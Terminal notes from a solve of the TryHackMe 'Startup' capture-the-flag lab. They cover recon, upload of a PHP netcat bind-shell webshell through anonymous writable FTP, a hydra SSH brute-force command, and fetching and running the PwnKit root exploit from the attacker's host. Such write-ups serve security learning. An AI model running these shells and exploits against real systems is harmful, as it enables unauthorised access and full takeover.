# https://tryhackme.com/room/startup

```bash
=================================
10.201.12.37 -- http://10.201.12.37 -- lin x32/x64
=================================

ping -c 1 -W 5 10.201.12.37

2025-08-14 18:56:37 -- sudo nmap -Pn -n -sC -sV -O -T4 -oA nmap_scan 10.201.12.37
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.2.0.82
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4

2025-08-14 18:59:14 -- ftp $TARGET
// ftp: [no pw]
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
// I dont know who it is, but Maya is looking pretty sus.
// username: Maya

2025-08-14 19:07:03 -- gobuster dir --threads 20 --wordlist /usr/share/wordlists/dirb/common.txt --url http://10.201.12.37
/files                (Status: 301) [Size: 312] [--> http://10.201.12.37/files/]                                                                        

### WEBSHELL

-rw-rw-r-- 1 vagrant vagrant 196 Aug 14 19:09 /tmp/tacos.php
<?php
  // Creates a named pipe, starts a shell, and plumbs it to a netcat listener.
  $cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f";
  system($cmd);
?>

put /tmp/tacos.php tacos.php
2025-08-14 19:13:48 -- curl http://$TARGET/files/ftp/tacos.php
nc -nv $TARGET 4444
// winner!

# TERMINAL UPGRADE
python -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo; fg

// got user

### INTERESTING THINGS

www-data
/home/lennie
www-data@startup:/$ ls -la /
total 100
drwxr-xr-x  25 root     root      4096 Aug 14 22:53 .
drwxr-xr-x  25 root     root      4096 Aug 14 22:53 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Aug 14 22:53 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 131 root     root         0 Aug 14 22:53 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       920 Aug 14 23:29 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Aug 14 23:29 sys
drwxrwxrwt   7 root     root      4096 Aug 14 23:30 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic


###

2025-08-14 19:31:43 -- find / -type f -name "user.txt" 2>/dev/null
// nothing

2025-08-14 19:23:02 -- hydra -t 4 -l lennie -P /usr/share/wordlists/rockyou.txt ssh://10.201.12.37

# lets see
cd /tmp
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
python3 -m http.server 8000

wget http://10.2.0.82:8000/PwnKit
chmod +x PwnKit
2025-08-14 19:34:58 -- ./PwnKit
// got root!

find / -type f -name "user.txt" 2>/dev/null
/home/lennie/user.txt

find / -type f -name "root.txt" 2>/dev/null
/root/root.txt
```